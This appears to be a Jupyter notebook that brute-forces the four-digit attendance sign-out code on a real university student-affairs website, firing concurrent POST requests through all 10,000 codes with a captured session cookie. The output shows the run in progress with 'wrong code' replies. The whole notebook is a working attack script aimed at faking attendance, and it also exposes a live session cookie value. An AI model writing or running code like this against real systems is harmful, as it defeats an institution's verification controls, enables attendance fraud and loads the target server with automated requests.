{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {
    "collapsed": true,
    "ExecuteTime": {
     "end_time": "2023-06-02T13:45:46.858434600Z",
     "start_time": "2023-06-02T13:45:46.849798500Z"
    }
   },
   "outputs": [],
   "source": [
    "import grequests\n",
    "from tqdm import tqdm\n",
    "from urllib.parse import parse_qs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "outputs": [],
   "source": [
    "def parse_cookie(cookie_text):\n",
    "    cookie_dict = {}\n",
    "    cookies = cookie_text.split(';')\n",
    "\n",
    "    for cookie in cookies:\n",
    "        cookie = cookie.strip()\n",
    "        if '=' in cookie:\n",
    "            name, value = cookie.split('=', 1)\n",
    "            cookie_dict[name] = value\n",
    "\n",
    "    return cookie_dict\n",
    "\n",
    "\n",
    "def parseQs(s):\n",
    "    return {k: v[0] for k, v in parse_qs(s).items()}"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2023-06-02T13:45:46.864323100Z",
     "start_time": "2023-06-02T13:45:46.859997300Z"
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "outputs": [],
   "source": [
    "\n",
    "cookie_text = \"GUEST_LANGUAGE_ID=zh_CN;JSESSIONID=522938E7B4BF37C36C9744AAA85A46FE;td_cookie=975708836;\"\n",
    "cookie_dict = parse_cookie(cookie_text)\n",
    "\n",
    "# 创建要请求的 URL 列表\n",
    "urls = [\n",
    "    'http://xggl.hnie.edu.cn/content/student/activity/stu/hdkq/attence?_t_s_=1685711368759',\n",
    "]\n",
    "\n",
    "headers = [\n",
    "    {\n",
    "        'Referer': 'http://xggl.hnie.edu.cn/wap/menu/student/activity/hdkq/stu/_child_/edit?dm=16855065809657888324&kqlx=2&_t_s_=1685711365320',\n",
    "        'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36 Edg/113.0.0.0',\n",
    "    }\n",
    "]\n",
    "\n",
    "post_data = \"kqm=1111&hddm=16855065809657888324&kqlx=2&operationType=Update&dm=16855065809657888324\"\n",
    "\n",
    "postData = [\n",
    "    {**parseQs(post_data), **{'kqm': '{:04d}'.format(i)}} for i in range(0, 9999 + 1)\n",
    "]\n",
    "\n",
    "# 创建 cookie 字典\n",
    "cookies = cookie_dict\n"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2023-06-02T13:45:46.962024400Z",
     "start_time": "2023-06-02T13:45:46.864323100Z"
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "kqm=2428{\"errorInfoList\":[{\"code\":null,\"message\":\"签退码错误\"}],\"result\":false,\"msg\":null}:  24%|##4       | 2430/10000 [02:36<11:27, 11.01it/s]  "
     ]
    }
   ],
   "source": [
    "requests = (grequests.post(url, cookies=cookies, data=data, headers=header) for url, header, data in\n",
    "            zip(urls * len(postData), headers * len(postData), postData))\n",
    "\n",
    "with tqdm(total=len(postData), ascii=True) as bar:\n",
    "    responses = grequests.imap(requests)\n",
    "    for response in responses:\n",
    "        bar.update()\n",
    "        if response is not None:\n",
    "            bar.set_description(str(response.request.body)[:len('kqm=9999')] + response.text)\n",
    "            # 处理响应数据\n",
    "            if str(response.text).find('false') == -1:\n",
    "                print('签到成功，找到可用签到码')\n",
    "                print(response.text)\n",
    "                print(response.request.body)\n",
    "                break\n"
   ],
   "metadata": {
    "collapsed": false,
    "is_executing": true,
    "ExecuteTime": {
     "start_time": "2023-06-02T13:49:20.782908100Z"
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "outputs": [],
   "source": [],
   "metadata": {
    "collapsed": false
   }
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 0
}
